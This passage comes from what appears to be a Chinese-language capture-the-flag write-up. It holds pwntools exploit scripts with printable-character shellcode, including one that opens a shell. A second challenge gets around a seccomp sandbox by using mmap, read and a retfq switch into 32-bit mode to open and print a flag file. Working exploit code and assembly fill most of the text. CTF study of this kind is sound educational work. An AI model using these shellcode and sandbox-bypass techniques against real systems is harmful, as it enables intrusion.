\`Y5&lt;_==P^SX-_A1&quot;-q@_~5(~o_P_AAAA!39(.d@;*ez0&amp;!4n_7lrt4n@1*&#125;~w&lt;?&#125;X9.543&#125;ng$h.j7g4w_iZ?%oQGq|&#123;&quot;7W%78w?s!|N8~?DB#*MA&lt;z$3[P.f0R*z7!|&#x27;&#x27;&#x27;</span></span><br><span class="line">payload1=<span class="string">&#x27;&#x27;&#x27;PZTAYAXVI31VXPP[_Hc4:14:SX-i+lr-!&amp;Xp5&gt;%?/P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-9OOd-Q_  5&gt;^??P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-W`h)-H   5Sw??P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-QZ##-|@ @57_?[P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-i+Fr-\  ^537_?P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-  uI-!@` 5:__~P^14:WX-_^/?-=apD-`@`|P_SX-@q`L- 0`x5:_?;P_Hc4:14:SX-IA00- %  5h&#123;??P^14:WX-_^/?-=apD-`@`|P_SX-?iCI- p?w5?&#x27;&#125;?P^SX-_b`P-b^`p5&#x27;???P_AAAA!39(.d@;*ez0&amp;!4n_7lrt4n@1*&#125;~w&lt;?&#125;X9.543&#125;ng$h.j7g4w_iZ?%oQGq|&#123;&quot;7W%78w?s!|N8~?DB#*MA&lt;z$3[P.f0R*z7!|&#x27;&#x27;&#x27;</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>再试一下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1610614861556-0008e9b3-bd1c-48c5-b66b-30e667bf4fd1.png#align=left&display=inline&height=900&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-14%2017.00.57.png&originHeight=900&originWidth=2752&size=232654&status=done&style=none&width=2752" alt="截屏2021-01-14 17.00.57.png"><br>成功获得 shell。如果不修改脚本代码可以使用如下命令编码正确的 shellcode：</p>
<blockquote>
<p>python2 main.py shellcode rax+29<br>暂不清楚 rax+29 的含义</p>
</blockquote>
<h1 id="禁用-system-和-open，并限制-shellcode-字符"><a href="#禁用-system-和-open，并限制-shellcode-字符" class="headerlink" title="禁用 system 和 open，并限制 shellcode 字符"></a>禁用 system 和 open，并限制 shellcode 字符</h1><p>当程序利用 sandbox 禁用 system 和 open 之后，应该怎么办？</p>
<blockquote>
<p>题目来自星盟师傅 ex 的 shellcode：<br><a target="_blank" rel="noopener" href="http://pwn.eonew.cn/challenge.php">http://pwn.eonew.cn/challenge.php</a></p>
</blockquote>
<p>检查一下文件的保护：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1610677720484-16930992-dea2-4ed1-a5fa-2f0b2e4d6ac3.png#align=left&display=inline&height=276&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-15%2010.28.33.png&originHeight=276&originWidth=1032&size=43370&status=done&style=none&width=1032" alt="截屏2021-01-15 10.28.33.png"><br>只开启了 NX 保护，64 位程序，IDA 里看一下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1610677784645-834c083e-2fa0-4e7a-ac35-442710b22483.png#align=left&display=inline&height=1130&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-15%2010.29.40.png&originHeight=1130&originWidth=1460&size=190148&status=done&style=none&width=1460" alt="截屏2021-01-15 10.29.40.png"><br>上来的一串变量和系统调用给我一种不好的预感，应该开启了 sandbox 并且程序限制了只能输入可见字符：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1610677883345-cc47456e-c41c-4231-a292-a078133456c3.png#align=left&display=inline&height=482&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-15%2010.31.19.png&originHeight=482&originWidth=1170&size=90032&status=done&style=none&width=1170" alt="截屏2021-01-15 10.31.19.png"><br>当然这道题并没有限制系统的架构，我们可以利用这一点来转换程序运行模式，和之前的 orw 一题还是不一样的：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1610678048353-180daf74-e90d-43ec-898b-873db4999963.png#align=left&display=inline&height=298&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-15%2010.34.04.png&originHeight=298&originWidth=1164&size=65456&status=done&style=none&width=1164" alt="截屏2021-01-15 10.34.04.png"><br>先来看一下系统调用表吧：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1610678134677-7ffbc9f3-4025-4beb-b721-3557a808baa0.png#align=left&display=inline&height=134&margin=%5Bobject%20Object%5D&name=image.png&originHeight=143&originWidth=410&size=13378&status=done&style=none&width=383" alt="image.png"><br>可以看到，在 64 位模式下系统虽然禁用了 open 函数，但是可以将程序切换到 32 位模式下来运行以此调用 open 函数，怎么转换？<br>修改程序运行模式需要用到<strong>retfq</strong>这个指令，这个指令有两步操作：<strong>ret 和 set cs</strong>。当 cs=0x23 程序以 32 位模式运行，当 cs=0x33 程序以 64 位模式运行。retfq 这个指令参数是放在栈中，[rsp]为要执行的代码的地址,[rsp + 0x8]为 0x23 或 0x33，类似于这样：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1610681550438-37af9f79-8394-4472-a2b0-f430c8bd2b2d.png#align=left&display=inline&height=112&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-15%2011.32.25.png&originHeight=112&originWidth=1698&size=30613&status=done&style=none&width=1698" alt="截屏2021-01-15 11.32.25.png"><br>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">DEBUG = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> DEBUG == <span class="number">0</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./shellcode_elf&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;nc.eonew.cn&#x27;</span>, <span class="number">10011</span>)</span><br><span class="line"></span><br><span class="line">code_append = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        push rcx</span></span><br><span class="line"><span class="string">        pop rcx</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment"># 用mmap分配一段内存空间</span></span><br><span class="line">code_mmap = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        /*mov rdi, 0x40404040*/</span></span><br><span class="line"><span class="string">        push 0x40404040</span></span><br><span class="line"><span class="string">        pop rdi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        /*mov rsi, 0x7e*/</span></span><br><span class="line"><span class="string">        push 0x7e</span></span><br><span class="line"><span class="string">        pop rsi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        /*mov rdx, 0x7*/</span></span><br><span class="line"><span class="string">        push 0x37</span></span><br><span class="line"><span class="string">        pop rax</span></span><br><span class="line"><span class="string">        xor al, 0x30</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        /*mov r8, 0*/</span></span><br><span class="line"><span class="string">        push 0x30</span></span><br><span class="line"><span class="string">        pop rax</span></span><br><span class="line"><span class="string">        xor al, 0x30</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        pop r8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        /*mov r9, 0*/</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        pop r9</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        /*syscall*/</span></span><br><span class="line"><span class="string">        push 0x5e</span></span><br><span class="line"><span class="string">        pop rcx</span></span><br><span class="line"><span class="string">        xor byte ptr [rbx+0x2c], cl</span></span><br><span class="line"><span class="string">        push 0x5c</span></span><br><span class="line"><span class="string">        pop rcx</span></span><br><span class="line"><span class="string">        xor byte ptr [rbx+0x2d], cl</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        /*mov rax, 0x9*/</span></span><br><span class="line"><span class="string">        push 0x39</span></span><br><span class="line"><span class="string">        pop rax</span></span><br><span class="line"><span class="string">        xor al, 0x30</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">code_read = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        /*mov rsi, 0x40404040*/</span></span><br><span class="line"><span class="string">        push 0x40404040</span></span><br><span class="line"><span class="string">        pop rsi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        /*mov rdi, 0*/</span></span><br><span class="line"><span class="string">        push 0x30</span></span><br><span class="line"><span class="string">        pop rax</span></span><br><span class="line"><span class="string">        xor al, 0x30</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        pop rdi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        /*mov rdx, 0x7e*/</span></span><br><span class="line"><span class="string">        push 0x7e</span></span><br><span class="line"><span class="string">        pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        /*mov rax, 0*/</span></span><br><span class="line"><span class="string">        push 0x30</span></span><br><span class="line"><span class="string">        pop rax</span></span><br><span class="line"><span class="string">        xor al, 0x30</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        /*syscall*/</span></span><br><span class="line"><span class="string">        push 0x5e</span></span><br><span class="line"><span class="string">        pop rcx</span></span><br><span class="line"><span class="string">        xor byte ptr [rbx+0x4f], cl</span></span><br><span class="line"><span class="string">        push 0x5c</span></span><br><span class="line"><span class="string">        pop rcx</span></span><br><span class="line"><span class="string">        xor byte ptr [rbx+0x50], cl</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">code_retfq = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        /* 算出0x48 */</span></span><br><span class="line"><span class="string">        push 0x39</span></span><br><span class="line"><span class="string">        pop rcx</span></span><br><span class="line"><span class="string">        xor byte ptr [rbx + 0x71], cl</span></span><br><span class="line"><span class="string">        push 0x20</span></span><br><span class="line"><span class="string">        pop rcx</span></span><br><span class="line"><span class="string">        xor byte ptr [rbx + 0x71], cl</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        /*</span></span><br><span class="line"><span class="string">        * 利用无借位减法算出0xcb</span></span><br><span class="line"><span class="string">        */</span></span><br><span class="line"><span class="string">        push 0x47</span></span><br><span class="line"><span class="string">        pop rcx</span></span><br><span class="line"><span class="string">        sub byte ptr [rbx + 0x72], cl</span></span><br><span class="line"><span class="string">        sub byte ptr [rbx + 0x72], cl</span></span><br><span class="line"><span class="string">        push rdi</span></span><br><span class="line"><span class="string">        push rdi</span></span><br><span class="line"><span class="string">        push 0x23</span></span><br><span class="line"><span class="string">        push 0x40404040</span></span><br><span class="line"><span class="string">        pop rax</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">code_open = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        /* open函数 */</span></span><br><span class="line"><span class="string">        mov esp, 0x40404550</span></span><br><span class="line"><span class="string">        push 0x67616c66</span></span><br><span class="line"><span class="string">        mov ebx, esp</span></span><br><span class="line"><span class="string">        xor ecx, ecx</span></span><br><span class="line"><span class="string">        xor edx, edx</span></span><br><span class="line"><span class="string">        mov eax, 0x5</span></span><br><span class="line"><span class="string">        int 0x80</span></span><br><span class="line"><span class="string">        mov ecx, eax</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">code_retfq_1 = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        /* retfq */</span></span><br><span class="line"><span class="string">        push 0x33</span></span><br><span class="line"><span class="string">        push 0x40404062 /* 具体数字有待修改 */</span></span><br><span class="line"><span class="string">        retfq</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">code_read_write = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        /* 修复栈 */</span></span><br><span class="line"><span class="string">        mov esp, 0x40404550 /* 有待修改 */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        /* read函数 */</span></span><br><span class="line"><span class="string">        mov rdi, rcx</span></span><br><span class="line"><span class="string">        mov rsi, 0x40404800</span></span><br><span class="line"><span class="string">        mov rdx, 0x7a</span></span><br><span class="line"><span class="string">        xor rax, rax</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        /* write函数 */</span></span><br><span class="line"><span class="string">        mov rdi, 0x1</span></span><br><span class="line"><span class="string">        mov rsi, 0x40404800</span></span><br><span class="line"><span class="string">        mov rdx, 0x7a</span></span><br><span class="line"><span class="string">        mov rax, 0x1</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p, &#x27;b * 0x4002eb\nc\nsi&#x27;)</span></span><br><span class="line">code  = code_mmap</span><br><span class="line">code += code_append</span><br><span class="line">code += code_read</span><br><span class="line">code += code_append</span><br><span class="line">code += code_retfq</span><br><span class="line">code += code_append</span><br><span class="line"></span><br><span class="line">code1  = code_open</span><br><span class="line">code1 += code_retfq_1</span><br><span class="line">code1 += code_read_write</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;shellcode: &quot;</span>, code)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendline(code1)</span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>

<p>看一下第一段 mmap 的代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">code_mmap = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        /*mov rdi, 0x40404040*/ /*set rdi*/</span></span><br><span class="line"><span class="string">        push 0x40404040</span></span><br><span class="line"><span class="string">        pop rdi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        /*mov rsi, 0x7e*/ /*set rsi*/</span></span><br><span class="line"><span class="string">        push 0x7e</span></span><br><span class="line"><span class="string">        pop rsi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        /*mov rdx, 0x7*/ /*set rdx*/</span></span><br><span class="line"><span class="string">        push 0x37</span></span><br><span class="line"><span class="string">        pop rax</span></span><br><span class="line"><span class="string">        xor al, 0x30</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        /*mov r8, 0*/ /*set r8*/</span></span><br><span class="line"><span class="string">        push 0x30</span></span><br><span class="line"><span class="string">        pop rax</span></span><br><span class="line"><span class="string">        xor al, 0x30</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        pop r8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        /*mov r9, 0*/ /*set r9*/</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        pop r9</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        /*syscall*/</span></span><br><span class="line"><span class="string">        push 0x5e</span></span><br><span class="line"><span class="string">        pop rcx</span></span><br><span class="line"><span class="string">        xor byte ptr [rbx+0x2c], cl</span></span><br><span class="line"><span class="string">        push 0x5c</span></span><br><span class="line"><span class="string">        pop rcx</span></span><br><span class="line"><span class="string">        xor byte ptr [rbx+0x2d], cl</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        /*mov rax, 0x9*/ /*set rax*/</span></span><br><span class="line"><span class="string">        push 0x39</span></span><br><span class="line"><span class="string">        pop rax</span></span><br><span class="line"><span class="string">        xor al, 0x30</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>mmap 的函数原型如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">mmap</span><span class="params">(<span class="keyword">void</span>* start,<span class="keyword">size_t</span> length,<span class="keyword">int</span> prot,<span class="keyword">int</span> flags,<span class="keyword">int</span> fd,<span class="keyword">off_t</span> offset)</span></span>;</span><br></pre></td></tr></table></figure>

<p>所以说上面一段代码相当于执行了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mmap(<span class="number">0x40404040</span>,<span class="number">0x7e</span>,<span class="number">7</span>,<span class="number">34</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1610679363173-4a2685b0-7b60-4093-92f8-eec127119a15.png#align=left&display=inline&height=162&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-15%2010.55.58.png&originHeight=284&originWidth=804&size=35645&status=done&style=none&width=459" alt="截屏2021-01-15 10.55.58.png"><br>为什么要先调用 mmap 向其中写入 32 位 shellcode？<br>因为 shellcode 是写到栈上面的，如果把 32 位的 shellcode 在栈上的话，因为 64 位的栈地址长度比 32 位的长，所以 32 位模式下是无法解析出 64 位的栈地址的，retfq 时就会 crash 掉，所以这里需要先调用 mmap 申请出一段适合 32 位的地址来存 32 位 shellcode：mmap(0x40404040,0x7e,7,34,0,0)，调用 mmap 之后（si，单步步入），内存分布如下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1610679797209-6088776f-7c05-47d4-9e1e-ee07503977d9.png#align=left&display=inline&height=348&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-15%2011.03.12.png&originHeight=348&originWidth=2000&size=72217&status=done&style=none&width=2000" alt="截屏2021-01-15 11.03.12.png"><br>可以看到，使用 mmap 申请出来了一片空间，接下来就该调用 read 函数向其中读入 32 位的 shellcode：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1610680545853-db89bf47-3db6-4148-b300-6186e2971600.png#align=left&display=inline&height=206&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-15%2011.15.37.png&originHeight=206&originWidth=982&size=37120&status=done&style=none&width=982" alt="截屏2021-01-15 11.15.37.png"><br>读入 x86 的 shellcode 之后，我们将程序从 64 位转换到 32 位，转换之前寄存器的值：<img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1610681502526-9c91befe-a67f-4133-8165-c4014b295cd3.png#align=left&display=inline&height=1038&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-15%2011.31.37.png&originHeight=1038&originWidth=1562&size=173955&status=done&style=none&width=1562" alt="截屏2021-01-15 11.31.37.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1610681824902-5cc603ec-522b-477a-b733-92f3d802df9a.png#align=left&display=inline&height=56&margin=%5Bobject%20Object%5D&name=image.png&originHeight=112&originWidth=1698&size=25760&status=done&style=none&width=849" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1610681714181-72e670e9-0da8-4768-a2a7-b0722a653280.png#align=left&display=inline&height=47&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-15%2011.35.06.png&originHeight=112&originWidth=796&size=17181&status=done&style=none&width=335" alt="截屏2021-01-15 11.35.06.png"><br>转换之后：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1610681922322-9ca8a3ea-a278-49c1-a940-f7cab5cacc2d.png#align=left&display=inline&height=1476&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-15%2011.38.32.png&originHeight=1476&originWidth=2750&size=252466&status=done&style=none&width=2750" alt="截屏2021-01-15 11.38.32.png"><br>再次说明，retfq 有两步操作，<code>ret以及set cs</code>，所以执行 retfq 会跳转到 rsp 同时将 cs 设置为[rsp+0x8]，我们只需要事先在 ret 位置写入 32 位的 shellcode 就可以执行了，但是这里有一点需要注意的是，retfq 跳转过去的时候程序已经切换成了 32 位模式，所以地址解析也是以 32 位的规则来的，所以原先的<code>rsp = 0x7ffcc0024b38</code>会被解析成<code>esp = 0xc0024b38</code><br>从上图中可以看到，在发生转换之后，由于 RSP 的出错导致 stack 无法读取，因为在由 64 位变为 32 位后，rsp 的值会变成非法值，故需先修复 rsp 的值再执行相应的代码：mov esp, 0x40404550，修复之后的结果如下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1610682289936-35ed916c-eb9d-4039-ba68-2aaa98e2273f.png#align=left&display=inline&height=72&margin=%5Bobject%20Object%5D&name=image.png&originHeight=144&originWidth=534&size=10485&status=done&style=none&width=267" alt="image.png"><br>接下来执行 32 位的 open 函数：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1610682403075-3b0f87a6-abec-473d-9ff9-ce24c013e197.png#align=left&display=inline&height=1586&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-15%2011.46.37.png&originHeight=1586&originWidth=2750&size=267098&status=done&style=none&width=2750" alt="截屏2021-01-15 11.46.37.png"><br>虽然程序已经转换到了 32 位模式下，但是调试器仍然认为该程序处于 64 位模式下，因此才会出现 syscall：SYS_fstat，其实上调用的是 32 位模式下的 open 函数。<br>调用完 open 函数之后，然后返回 64 位模式下：<br><strong>这里需要先把 open 的返回值保存到别的寄存器，因为在 retfq 回 64 位模式的时候会影响到 rax</strong><br>转换前：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1610682831631-22e4c713-6bb8-41c3-9ed5-e051eec59056.png#align=left&display=inline&height=298&margin=%5Bobject%20Object%5D&name=image.png&originHeight=596&originWidth=1362&size=78118&status=done&style=none&width=681" alt="image.png"><br>转换后：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1610682872726-62ccf078-7557-4cea-b3e7-eafa9e1ccb25.png#align=left&display=inline&height=604&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-15%2011.54.27.png&originHeight=604&originWidth=1572&size=91390&status=done&style=none&width=1572" alt="截屏2021-01-15 11.54.27.png"><br>走到这一步这道题基本完成了，我一开始的想法是直接调用 32 位下的 read,write 把 flag 打印出来，但是发现是 bad system call，无法调用，所以还得回到 64 位模式下调用，再调用一次 retfq，紧接着在 64 位下调用 read 读入 64 位的 shellcode，然后再调用 write 打印出来 flag 就可以了。<br>总结一下思路：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、用可见字符编写shellcode 调用mmap申请地址，调用read读入<span class="number">32</span>位shellcode</span><br><span class="line"><span class="number">2</span>、同时构造用retfq切换到<span class="number">32</span>位模式，跳转到<span class="number">32</span>位shellcode位置</span><br><span class="line"><span class="number">3</span>、按照<span class="number">32</span>位规则调用fp = <span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line"><span class="number">4</span>、保存<span class="built_in">open</span>函数返回的fp指针，再次调用retfq切换回<span class="number">64</span>模式，跳转到<span class="number">64</span>位shellcode位置</span><br><span class="line"><span class="number">5</span>、执行read,write打印flag</span><br></pre></td></tr></table></figure>

<p>这道题让我写是肯定写不出来的，只能学习一个大致思路，ex 师傅 tql。</p>
